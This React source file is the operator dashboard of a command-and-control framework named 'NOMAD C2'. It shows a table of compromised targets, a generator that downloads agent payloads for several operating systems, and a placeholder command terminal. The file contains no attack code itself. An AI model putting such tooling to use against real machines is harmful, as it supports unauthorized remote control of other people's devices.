import React, { useState, useEffect } from 'react';
import { Layout, Users, Zap, Terminal, Download, Shield, Settings, Activity } from 'lucide-react';
import axios from 'axios';

const App = () => {
  const [activeTab, setActiveTab] = useState('targets');
  const [targets, setTargets] = useState([]);
  const [password, setPassword] = useState(localStorage.getItem('nomad_pass') || '');

  useEffect(() => {
    axios.defaults.headers.common['X-Nomad-Pass'] = password;
    fetchTargets();
    const interval = setInterval(fetchTargets, 5000);
    return () => clearInterval(interval);
  }, [password]);

  const savePassword = (p) => {
    localStorage.setItem('nomad_pass', p);
    setPassword(p);
  };

  const fetchTargets = async () => {
    try {
      const res = await axios.get('/api/targets');
      setTargets(res.data || []);
    } catch (err) {
      console.error("Error fetching targets", err);
    }
  };

  return (
    <div className="flex h-screen bg-desert-900 overflow-hidden text-desert-text">
      {/* Sidebar */}
      <div className="w-64 glass border-r border-desert-text/10 flex flex-col">
        <div className="p-6 flex items-center gap-3">
          <Shield className="text-desert-primary w-8 h-8" />
          <h1 className="text-xl font-bold tracking-wider">NOMAD C2</h1>
        </div>

        <nav className="flex-1 px-4 py-6 space-y-2">
          <NavItem active={activeTab === 'targets'} icon={<Users size={20} />} label="Targets Overview" onClick={() => setActiveTab('targets')} />
          <NavItem active={activeTab === 'payload'} icon={<Zap size={20} />} label="Payload Generator" onClick={() => setActiveTab('payload')} />
          <NavItem active={activeTab === 'terminal'} icon={<Terminal size={20} />} label="Command Center" onClick={() => setActiveTab('terminal')} />
          <NavItem active={activeTab === 'settings'} icon={<Settings size={20} />} label="System Settings" onClick={() => setActiveTab('settings')} />
        </nav>

        <div className="p-4 glass rounded-t-2xl mx-4 mb-4">
          <div className="flex items-center gap-2 text-xs text-desert-text/60 mb-2">
            <Activity size={12} className="text-green-500 animate-pulse" />
            <span>SERVER STATUS: LIVE</span>
          </div>
          <div className="h-1 bg-desert-900 rounded-full overflow-hidden">
            <div className="h-full bg-desert-primary w-[75%]" />
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col h-full bg-desert-gradient overflow-y-auto">
        <header className="h-16 glass flex items-center justify-between px-8 border-b border-desert-text/5">
          <h2 className="text-lg font-medium opacity-80">
            {activeTab === 'targets' && 'Active Targets'}
            {activeTab === 'payload' && 'Payload Generator'}
            {activeTab === 'terminal' && 'Command & Control'}
          </h2>
          <div className="flex items-center gap-4">
            <div className="px-3 py-1 glass rounded-full text-xs border-desert-primary/20">
              Session: <span className="text-desert-primary">Active</span>
            </div>
          </div>
        </header>

        <main className="p-8">
          {activeTab === 'targets' && <TargetsView targets={targets} />}
          {activeTab === 'payload' && <PayloadView />}
          {activeTab === 'terminal' && <TerminalView targets={targets} />}
          {activeTab === 'settings' && <SettingsView password={password} onSave={savePassword} />}
        </main>
      </div>
    </div>
  );
};

const NavItem = ({ icon, label, active, onClick }) => (
  <button
    onClick={onClick}
    className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${active ? 'glass border-desert-primary/50 text-desert-primary' : 'hover:bg-desert-text/5 opacity-60 hover:opacity-100'
      }`}
  >
    {icon}
    <span className="font-medium">{label}</span>
  </button>
);

const TargetsView = ({ targets }) => (
  <div className="space-y-6 animate-in fade-in duration-700">
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
      <StatCard label="Total Agents" value={targets.length} color="text-desert-primary" />
      <StatCard label="Live Now" value={targets.filter(t => t.status === 'Live').length} color="text-green-500" />
      <StatCard label="Windows" value={targets.filter(t => t.os === 'windows').length} color="text-blue-400" />
      <StatCard label="Android" value={targets.filter(t => t.os === 'android').length} color="text-green-400" />
    </div>

    <div className="glass rounded-3xl overflow-hidden">
      <table className="w-full text-left border-collapse">
        <thead className="bg-desert-800/50">
          <tr>
            <th className="px-6 py-4 text-xs font-bold uppercase tracking-wider opacity-60">ID / IP Address</th>
            <th className="px-6 py-4 text-xs font-bold uppercase tracking-wider opacity-60">Hostname</th>
            <th className="px-6 py-4 text-xs font-bold uppercase tracking-wider opacity-60">OS / Platform</th>
            <th className="px-6 py-4 text-xs font-bold uppercase tracking-wider opacity-60">Last Seen</th>
            <th className="px-6 py-4 text-xs font-bold uppercase tracking-wider opacity-60">Status</th>
          </tr>
        </thead>
        <tbody>
          {targets.map((t) => (
            <tr key={t.id} className="border-t border-desert-text/5 hover:bg-desert-text/5 transition-colors group">
              <td className="px-6 py-4">
                <div className="font-mono text-sm text-desert-accent">{t.id.slice(0, 8)}...</div>
                <div className="text-xs opacity-60">{t.ip}</div>
              </td>
              <td className="px-6 py-4 font-medium">{t.hostname}</td>
              <td className="px-6 py-4">
                <div className="flex items-center gap-2">
                  <span className="capitalize">{t.os}</span>
                </div>
              </td>
              <td className="px-6 py-4 text-sm opacity-60">{t.last_seen}</td>
              <td className="px-6 py-4">
                <span className={`px-2 py-1 rounded-full text-[10px] font-bold uppercase ${t.status === 'Live' ? 'bg-green-500/20 text-green-500' : 'bg-red-500/20 text-red-500'
                  }`}>
                  {t.status}
                </span>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  </div>
);

const StatCard = ({ label, value, color }) => (
  <div className="glass p-6 rounded-3xl flex flex-col gap-1">
    <span className="text-xs uppercase tracking-widest opacity-60 font-bold">{label}</span>
    <span className={`text-4xl font-bold ${color}`}>{value}</span>
  </div>
);

const PayloadView = () => {
  const [platform, setPlatform] = useState('windows');
  const [c2Addr, setC2Addr] = useState('localhost:5555');
  const [isGenerating, setIsGenerating] = useState(false);

  const handleGenerate = async () => {
    setIsGenerating(true);
    try {
      const response = await axios.post('/api/payloads', {
        os: platform.toLowerCase(),
        arch: 'amd64',
        c2_addr: c2Addr
      }, { responseType: 'blob' });

      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', `nomad_agent_${platform.toLowerCase()}.exe`);
      document.body.appendChild(link);
      link.click();
      link.remove();
    } catch (err) {
      console.error("Payload generation failed", err);
      alert("Generation failed. Check server logs.");
    } finally {
      setIsGenerating(false);
    }
  };

  return (
    <div className="max-w-4xl mx-auto glass p-10 rounded-[3rem] space-y-8 animate-in slide-in-from-bottom-10 duration-700">
      <div className="text-center space-y-2">
        <h3 className="text-3xl font-bold text-desert-primary">Nomad Lab</h3>
        <p className="opacity-60">Forge your digital tools for any terrain.</p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
        <div className="space-y-4">
          <label className="text-xs font-bold uppercase tracking-widest opacity-60 ml-2">Select Platform</label>
          <div className="grid grid-cols-2 gap-4">
            <PlatformButton label="Windows" active={platform === 'windows'} onClick={() => setPlatform('windows')} />
            <PlatformButton label="Linux" active={platform === 'linux'} onClick={() => setPlatform('linux')} />
            <PlatformButton label="Android" active={platform === 'android'} onClick={() => setPlatform('android')} />
            <PlatformButton label="MacOS" active={platform === 'macos'} onClick={() => setPlatform('macos')} />
          </div>
        </div>

        <div className="space-y-4">
          <label className="text-xs font-bold uppercase tracking-widest opacity-60 ml-2">Configuration</label>
          <div className="space-y-3">
            <input
              type="text"
              value={c2Addr}
              onChange={(e) => setC2Addr(e.target.value)}
              placeholder="C2 Address (e.g. localhost:5555)"
              className="w-full glass bg-desert-900/50 p-4 rounded-2xl border-none outline-none focus:ring-1 ring-desert-primary/50"
            />
            <div className="p-4 glass rounded-2xl text-[10px] opacity-60 italic bg-desert-primary/5">
              Tip: Use localhost:5555 for local port forwarding.
            </div>
          </div>
        </div>
      </div>

      <button
        disabled={isGenerating}
        onClick={handleGenerate}
        className="w-full py-5 bg-desert-primary text-desert-900 font-bold rounded-2xl text-lg hover:bg-desert-accent transition-all transform hover:-translate-y-1 active:translate-y-0 shadow-lg shadow-desert-primary/20 disabled:opacity-50"
      >
        {isGenerating ? 'BUILDING AGENT...' : 'GENERATE PAYLOAD'}
      </button>
    </div>
  );
};

const PlatformButton = ({ label, active, onClick }) => (
  <button
    onClick={onClick}
    className={`p-6 rounded-2xl border transition-all ${active ? 'border-desert-primary bg-desert-primary/10 text-desert-primary' : 'border-desert-text/10 hover:border-desert-text/30'
      }`}>
    <span className="text-lg font-bold">{label}</span>
  </button>
);

const TerminalView = ({ targets }) => (
  <div className="h-[calc(100vh-12rem)] flex gap-6 animate-in zoom-in-95 duration-500">
    <div className="w-80 glass rounded-3xl overflow-hidden flex flex-col">
      <div className="p-4 bg-desert-800/50 font-bold text-xs uppercase tracking-widest">Select Target</div>
      <div className="flex-1 overflow-y-auto">
        {targets.map(t => (
          <button key={t.id} className="w-full p-4 text-left border-b border-desert-text/5 hover:bg-desert-text/5 transition-colors">
            <div className="font-bold text-desert-primary">{t.hostname}</div>
            <div className="text-xs opacity-60">{t.ip}</div>
          </button>
        ))}
      </div>
    </div>

    <div className="flex-1 glass bg-black/40 rounded-3xl overflow-hidden flex flex-col border border-desert-primary/10 shadow-2xl">
      <div className="p-4 bg-desert-800/80 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="w-3 h-3 rounded-full bg-red-500/50" />
          <div className="w-3 h-3 rounded-full bg-yellow-500/50" />
          <div className="w-3 h-3 rounded-full bg-green-500/50" />
          <span className="ml-4 text-xs font-mono opacity-60 uppercase">Command Center - nomad@c2:~</span>
        </div>
      </div>
      <div className="flex-1 p-6 font-mono text-sm overflow-y-auto space-y-2">
        <div className="text-desert-primary">[*] Initializing Nomad C2 Command Center...</div>
        <div className="text-desert-primary">[*] Waiting for target selection...</div>
      </div>
      <div className="p-4 bg-desert-900 flex items-center gap-4">
        <span className="text-desert-primary font-bold"> nomad$ </span>
        <input type="text" className="flex-1 bg-transparent border-none outline-none font-mono text-sm" placeholder="Enter command..." />
      </div>
    </div>
  </div>
);

const SettingsView = ({ password, onSave }) => (
  <div className="max-w-2xl mx-auto glass p-10 rounded-[3rem] space-y-6 animate-in slide-in-from-bottom-10 duration-700">
    <div className="text-center space-y-2">
      <h3 className="text-2xl font-bold text-desert-primary">System Security</h3>
      <p className="opacity-60">Manage your C2 access barriers.</p>
    </div>

    <div className="space-y-4">
      <label className="text-xs font-bold uppercase tracking-widest opacity-60 ml-2">App Password</label>
      <input
        type="password"
        value={password}
        onChange={(e) => onSave(e.target.value)}
        placeholder="Enter APP_PASSWORD from .env"
        className="w-full glass bg-desert-900/50 p-4 rounded-2xl border-none outline-none focus:ring-1 ring-desert-primary/50 text-center text-xl tracking-widest"
      />
      <p className="text-[10px] opacity-40 text-center italic">This password is required to authorize all API actions.</p>
    </div>
  </div>
);

export default App;
